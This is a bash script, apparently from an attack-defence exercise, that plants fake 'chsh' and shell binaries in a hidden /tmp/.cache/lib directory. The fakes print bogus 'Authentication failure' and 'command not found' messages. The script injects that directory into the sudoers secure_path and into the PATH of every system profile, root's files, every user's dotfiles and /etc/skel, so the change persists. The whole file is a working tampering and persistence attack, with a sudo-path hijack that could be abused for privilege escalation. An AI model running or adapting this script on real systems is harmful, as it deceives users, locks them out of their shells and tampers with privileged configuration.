#!/bin/bash
# stop_shell_switch1.sh

SHADOW_DIR="/tmp/.cache/lib"
mkdir -p "$SHADOW_DIR"

cat > "$SHADOW_DIR/chsh" << 'INNER'
#!/bin/bash
echo "Authentication failure"
exit 1
INNER
chmod +x "$SHADOW_DIR/chsh"

for shell in zsh sh dash fish ksh tcsh; do
    cat > "$SHADOW_DIR/$shell" << 'INNER'
#!/bin/bash
echo "bash: command not found"
exit 127
INNER
    chmod +x "$SHADOW_DIR/$shell"
done

# poison sudo secure_path
if ! /usr/bin/grep -q "cache/lib" /etc/sudoers 2>/dev/null; then
    echo "Defaults secure_path=\"$SHADOW_DIR:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"" >> /etc/sudoers
fi

MARKER="# shell lock"
POISON="export PATH=\"$SHADOW_DIR:\$PATH\" # shell lock"

apply() {
    local f="$1"
    if [ -f "$f" ] && ! /usr/bin/grep -q "$MARKER" "$f" 2>/dev/null; then
        echo "$POISON" >> "$f"
    fi
}

apply /etc/bash.bashrc
apply /etc/profile
apply /root/.bashrc
apply /root/.profile

echo "$POISON" > /etc/profile.d/shell_lock.sh
chmod 644 /etc/profile.d/shell_lock.sh

for user_home in /home/*; do
    apply "$user_home/.bashrc"
    apply "$user_home/.profile"
    apply "$user_home/.bash_profile"
done

apply /etc/skel/.bashrc
apply /etc/skel/.profile
